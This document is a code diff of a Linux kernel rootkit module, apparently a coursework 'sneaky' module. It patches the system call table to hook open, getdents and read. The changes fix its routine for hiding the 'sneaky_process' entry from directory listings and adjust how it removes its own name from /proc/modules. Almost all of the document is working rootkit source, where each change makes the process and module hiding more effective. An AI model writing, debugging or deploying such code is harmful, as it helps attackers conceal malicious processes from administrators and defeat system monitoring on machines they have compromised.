@@ -39,8 +39,8 @@ static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;
 // static bool hide_spid_flag = False;
 static bool hide_module_flag = false;
 static char *spid = "";
-module_param(spid, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
-MODULE_PARM_DESC(spid, "Sneaky Process Pid");
+module_param(spid, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
+MODULE_PARM_DESC(spid, "sneaky_process pid");
 
 // Function pointer will be used to save address of original 'open' syscall.
 // The asmlinkage keyword is a GCC #define that indicates this function
@@ -51,7 +51,7 @@ asmlinkage int (*original_call)(const char *pathname, int flags);
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp,
                                     unsigned int count);
 
-asmlinkage int (*original_read)(int fd, void *buf, size_t count);
+asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
 
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
                                    unsigned int count) {
@@ -60,7 +60,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
   int cursor = 0;
   while (cursor < returned_sz) {
 
-    curr = (struct linux_dirent *)((char *)curr + cursor);
+    curr = (struct linux_dirent *)((char *)dirp + cursor);
     unsigned short curr_reclen = curr->d_reclen;
     // check sneaky_process
     if (!strcmp(curr->d_name, "sneaky_process") ||
@@ -75,9 +75,9 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
       char *next = (char *)curr + curr_reclen;
       size_t sz_dif = (size_t)(next - (char *)dirp);
       size_t count = returned_sz - sz_dif;
-      memcpy(curr, next, count);
-      returned_sz = returned_sz - cursor;
-      break;
+      memmove(curr, next, count);
+      returned_sz = returned_sz - curr_reclen;
+      continue;
     }
 
     cursor = cursor + curr->d_reclen;
@@ -89,6 +89,12 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
 // Need to consider /proc and /proc/modules
 // If hide_spid_flag ==True, close it and change it to False.
 // If hide_module_flag ==True,close it and change it to False.
+
+/* asmlinkage int sneaky_sys_open(const char *pathname, int flags) { */
+/*   printk(KERN_INFO "Very, very Sneaky!\n"); */
+/*   return original_call(pathname, flags); */
+/* } */
+
 asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
   int result;
   int status;
@@ -128,9 +134,9 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
     char *module_ptr = strstr(buf, module_name);
     if (module_ptr) {
       char *curr = strstr(buf, "\n");
-      size_t sz_diff = (size_t)(curr - (char *)buf);
-      size_t count = byte_read - sz_diff;
-      size_t sneaky_module_sz = (size_t)(curr - module_ptr);
+      ssize_t sz_diff = (size_t)(curr - (char *)buf);
+      ssize_t count = byte_read - sz_diff;
+      ssize_t sneaky_module_sz = (size_t)(curr - module_ptr);
       memcpy(module_ptr, curr + 1, count);
       byte_read = byte_read - sneaky_module_sz;
     }
@@ -165,8 +171,8 @@ static int initialize_sneaky_module(void) {
   original_getdents = (void *)*(sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
 
-  original_read = (void *)*(sys_call_table + __NR_read);
-  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
+  // original_read = (void *)*(sys_call_table + __NR_read);
+  // *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
   // Revert page to read-only
   pages_ro(page_ptr, 1);
@@ -194,7 +200,7 @@ static void exit_sneaky_module(void) {
   // function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
-  *(sys_call_table + __NR_read) = (unsigned long)original_read;
+  // *(sys_call_table + __NR_read) = (unsigned long)original_read;
 
   // Revert page to read-only
   pages_ro(page_ptr, 1);
